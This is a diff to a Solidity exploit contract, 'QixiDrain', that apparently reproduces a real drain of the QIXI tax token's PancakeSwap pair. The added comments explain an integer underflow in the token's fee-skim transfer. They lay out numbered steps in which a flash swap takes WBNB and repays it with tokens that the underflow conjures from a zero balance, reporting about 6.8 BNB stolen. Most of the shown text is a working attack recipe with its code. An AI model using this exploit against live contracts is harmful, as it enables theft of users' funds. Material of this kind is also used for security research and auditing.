@@ -37,6 +37,24 @@ pragma solidity ^0.8.10;
 // cause: QIXI's supply/balance is attacker-controlled, so the pair's k-check is
 // meaningless.
 
+// VULNERABILITY: Integer Underflow in Fee Skim + Flash-Swap Repayment with Inflated Balance (QIXI Tax Token)
+// [detailed explanation with code references]
+// Root cause in Token.sol:
+//   _transfer:102
+//     if(!_isExcludedFromfew[from] && !_isExcludedFromfew[to]){
+//       ... for(int i=0;i <=9;i++) { _basicTransfer(from,ad,freeToken/10); }  // 10 skims from 'from'
+//       value -= freeToken;
+//     }
+//   _basicTransfer:145
+//     balanceOf[sender] -= value;   // <--- 0.4.25 UNCHECKED (SafeMath.sub NOT used here)
+//     balanceOf[recipient] += value;
+//   Later main path uses .sub/.add (SafeMath) but after the underflow has already granted ~2^256.
+// Pair (PancakePair.sol:475):
+//   require(balance0Adjusted.mul(balance1Adjusted) >= ... , 'Pancake: K');
+//   Only cares that "enough" tokens arrived in balance delta; no valuation of the token itself.
+// Impact: ~6.8 BNB drained. Attacker balance starts 0; underflow during repay transfer itself creates the repayment tokens.
+// See also detailed EXPLOIT STEPS below in QixiDrain.
+
 interface IERC20 {
     function balanceOf(address) external view returns (uint256);
     function transfer(address, uint256) external returns (bool);
@@ -57,6 +75,18 @@ contract QixiDrain {
         Pair.swap(0, WBNB.balanceOf(address(Pair)) - 1e7, address(this), bytes("0x123"));
     }
 
+    // EXPLOIT STEPS:
+    // 1. QixiDrain.run() calls Pair.swap(0, wbnbReserve-1e7, this, data)  [requests WBNB]
+    // 2. Pair.swap (PancakePair.sol):
+    //      - optimistic WBNB transfer to this (drains the real asset)
+    //      - pancakeCall(this, 0, amountWbnb, data)
+    // 3. pancakeCall does QIXI.transfer(Pair, 1e15 * 1e18)   [from balance=0]
+    // 4. QIXI Token._transfer (from=this, to=Pair):
+    //      - skim loop (Token.sol:109-114): 10x _basicTransfer(this, rand, small)
+    //        each: balanceOf[this] -= small  ==> underflow 0 -> ~uint256.max
+    //      - then main accounting credits Pair with nearly the full amount
+    // 5. Pair continues, amountIn computed from delta (huge), K check passes (PancakePair:475)
+    // 6. Exploit retains the WBNB; pair's QIXI "reserve" is now meaningless huge number.
     function pancakeCall(address, uint256, uint256, bytes calldata) external {
         // Repay the flash-swap by transferring a vast amount of QIXI to the pair.
         // The exploit's QIXI balance started at 0; QIXI._transfer's fee-scatter
